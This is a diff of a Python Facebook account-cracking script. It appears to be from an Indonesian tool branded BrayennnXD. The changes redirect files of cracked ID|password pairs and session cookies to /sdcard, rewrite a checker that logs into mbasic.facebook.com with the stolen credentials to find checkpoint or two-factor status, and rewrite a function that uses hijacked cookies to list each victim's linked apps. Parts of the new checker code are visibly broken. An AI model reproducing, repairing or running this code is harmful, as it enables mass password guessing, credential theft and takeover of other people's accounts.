@@ -1552,7 +1552,7 @@ def kontol(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1561,7 +1561,7 @@ def kontol(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1574,7 +1574,7 @@ def kontol(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1584,7 +1584,7 @@ def kontol(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1641,7 +1641,7 @@ def bapi(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1650,7 +1650,7 @@ def bapi(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1663,7 +1663,7 @@ def bapi(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1673,7 +1673,7 @@ def bapi(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1711,7 +1711,7 @@ def colmek1(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1720,7 +1720,7 @@ def colmek1(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1733,7 +1733,7 @@ def colmek1(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1743,7 +1743,7 @@ def colmek1(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1781,7 +1781,7 @@ def validate1(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1790,7 +1790,7 @@ def validate1(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1803,7 +1803,7 @@ def validate1(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1813,7 +1813,7 @@ def validate1(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1869,7 +1869,7 @@ def reguler1(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1878,7 +1878,7 @@ def reguler1(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1891,7 +1891,7 @@ def reguler1(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1901,7 +1901,7 @@ def reguler1(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -1936,7 +1936,7 @@ def crack(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -1945,7 +1945,7 @@ def crack(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -1958,7 +1958,7 @@ def crack(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -1968,7 +1968,7 @@ def crack(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -2003,7 +2003,7 @@ def crackfree(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -2012,7 +2012,7 @@ def crackfree(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -2025,7 +2025,7 @@ def crackfree(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -2035,7 +2035,7 @@ def crackfree(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -2073,7 +2073,7 @@ def cracktouch(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
@@ -2082,7 +2082,7 @@ def cracktouch(idf,pwv):
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -2095,7 +2095,7 @@ def cracktouch(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -2105,7 +2105,7 @@ def cracktouch(idf,pwv):
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -2140,18 +2140,18 @@ def crackmbasic(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='CP')
 					cetak(statuscp1)
-					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
 					break
@@ -2162,9 +2162,9 @@ def crackmbasic(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
@@ -2172,9 +2172,9 @@ def crackmbasic(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='OK')
 					cetak(statusok1)
-					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+					open('/sdcard/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
 				
@@ -2183,36 +2183,58 @@ def crackmbasic(idf,pwv):
 		except requests.exceptions.ConnectionError:
 			time.sleep(31)
 	loop+=1
-#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
-def ceker(idf,pw):
-	global cp
-	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
-	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-	ses = requests.Session()
+#-----------------------[ CEK APLIKASI ]--------------------#
+def cek_apk(kuki):
+	session = requests.Session()
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
 	try:
-		hi = ses.get('https://mbasic.facebook.com')
-		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
-		jo = ho.find('form')
-		data = {}
-		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
-		for anj in jo('input'):
-			if anj.get('name') in lion:
-				data.update({anj.get('name'):anj.get('value')})
-		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
-		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
-		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-		cp+=1
-		opsi = kent.find_all('option')
-		if len(opsi)==0:
-			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
+		for i in range(len(game)):
+			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
+	except AttributeError:
+		print ("\r    %s\033[0m cookie invalid"%(M))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
+	except AttributeError:
+		print ("\r    %s \033[0mcookie invalid"%(M))
+
+def ceker(idf,pw):
+	try:
+		h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent': ua}
+		res = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr',headers=h2).text
+		ress = parser(res, 'html.parser')
+		form = ress.find('form',{'method':'post'})
+		data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
+		data2.update({
+					'email':idf,
+					'pass':pw})
+		res = ses.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
+		ress = parser(res, 'html.parser')
+		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
+			akun += f' [+] Akun Tap Yess Cek Di Mbasic                   '
 		else:
-			for opsii in opsi:
-				print('\r%s---> %s%s'%(kk,opsii.text,x))
-	except Exception as c:
-		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
-		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
-		open('/sdcard/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-		cp+=1
+			if(len(sesi(res))==0):
+				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):
+					akun += f' [+] Akun Terpasang A2F                    '
+				else:
+					akun += f' [+] Akun Tidak Checkpoint Cek Di Mbasic                  '
+			else:
+				akun += f' [+] Terdapat {len(opsi)} Opsi Checkpoint :                     '
+				o = 0
+				for cp in opsi:
+					o+=1
+					akun += f' [+] {cp}               '
+		opsi.clear()
+	except Exception as e:
+		akun += f' [+] Kata Sandi Salah Kemungkinan Anda Terkena Spam Ip                  '
+	print(akun)
 #--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
 def cek_opsi():
 	c = len(akun)
@@ -2270,26 +2292,6 @@ def cek_opsi():
 	dah = '# DONE'
 	sol().print(mark(dah, style='green'))
 	exit()
-#----------------------[ CEK-APLIKASI ]---------------------#
-def cek_apk(session,cookie):
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
-	sop = BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
-	else:
-		for i in range(len(game)):
-			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
-	sop = BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
-	else:
-		for i in range(len(game)):
-			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
 #------------------[ DEFF SPAM SMS ]-------------------#
 
 agent = random.choice(
